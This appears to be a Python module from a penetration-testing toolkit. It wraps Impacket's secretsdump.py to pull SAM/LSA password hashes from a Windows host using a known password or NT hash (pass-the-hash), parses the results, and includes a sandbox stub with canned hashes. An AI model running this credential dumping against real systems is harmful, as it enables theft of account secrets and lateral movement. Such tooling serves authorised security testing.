"""Impacket one-clicks — secretsdump (Backlog #32, explicit creds only).

Dumping SAM/LSA secrets needs exactly one already-known credential
(password or NT hash) for one host you own — never a spray, never a
guess. This module runs that single explicit `secretsdump.py` call and
parses the `user:rid:lm:nt:::` lines into a structured result.
Sandbox returns canned hashes without spawning anything.
"""

from __future__ import annotations

import logging
import re
import subprocess  # nosec B404 - fixed-argv impacket wrapper
from typing import Any

logger = logging.getLogger("h4k.impacket")

SECRETDUMP = "secretsdump.py"

_HASH_LINE_RE = re.compile(
    r"^([^:\s][^:]*):(\d+):([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):::$"
)


def parse_secretsdump(stdout: str) -> list[dict[str, str]]:
    """Parse `user:rid:lm:nt:::` lines out of secretsdump output."""
    found: list[dict[str, str]] = []
    for line in (stdout or "").splitlines():
        m = _HASH_LINE_RE.match(line.strip())
        if not m:
            continue
        user, rid, lm, nt = m.groups()
        if user.endswith("$"):
            continue  # machine accounts are noise for the operator ledger
        entry = {"user": user, "rid": rid, "lm": lm, "nt": nt}
        if entry not in found:
            found.append(entry)
    return found


def _run(argv: list[str], timeout: int = 600) -> dict[str, Any]:
    try:
        proc = subprocess.run(  # nosec B603 - fixed argv, no shell
            argv, capture_output=True, text=True, timeout=timeout, check=False
        )
        return {
            "stdout": proc.stdout or "",
            "stderr": proc.stderr or "",
            "rc": proc.returncode,
            "success": proc.returncode == 0,
            "timed_out": False,
        }
    except subprocess.TimeoutExpired as exc:
        return {
            "stdout": _as_text(exc.stdout),
            "stderr": _as_text(exc.stderr),
            "rc": None,
            "success": False,
            "timed_out": True,
        }
    except FileNotFoundError:
        return {
            "stdout": "",
            "stderr": "impacket not installed",
            "rc": -1,
            "success": False,
            "timed_out": False,
        }
    except Exception as exc:  # pragma: no cover - defensive
        return {
            "stdout": "",
            "stderr": str(exc),
            "rc": -1,
            "success": False,
            "timed_out": False,
        }


def secretsdump(
    target: str,
    username: str,
    password: str | None = None,
    nthash: str | None = None,
    domain: str = "",
    timeout: int = 600,
) -> dict[str, Any]:
    """Dump SAM/LSA secrets with one explicit credential (or NT hash)."""
    secret = f":{nthash.strip()}" if nthash else f":{password or ''}"
    argv = [SECRETDUMP, f"{domain}/{username}{secret}@{target}"]
    result = _run(argv, timeout=timeout + 60)
    hashes = parse_secretsdump(result["stdout"])
    return {**result, "hashes": hashes, "hash_count": len(hashes)}


def sandbox_dump(target: str) -> dict[str, Any]:
    """Deterministic offline stand-in (sandbox/e2e only)."""
    stdout = (
        "Impacket v0.12.0 - sandbox canned output\n"
        "Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n"
        "svc-backup:1104:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\n"
    )
    return {
        "stdout": stdout,
        "stderr": "",
        "rc": 0,
        "success": True,
        "timed_out": False,
        "hashes": parse_secretsdump(stdout),
        "hash_count": 2,
        "target": target,
        "sandbox": True,
    }


def _as_text(data: str | bytes | None) -> str:
    if data is None:
        return ""
    if isinstance(data, bytes):
        return data.decode("utf-8", errors="replace")
    return data
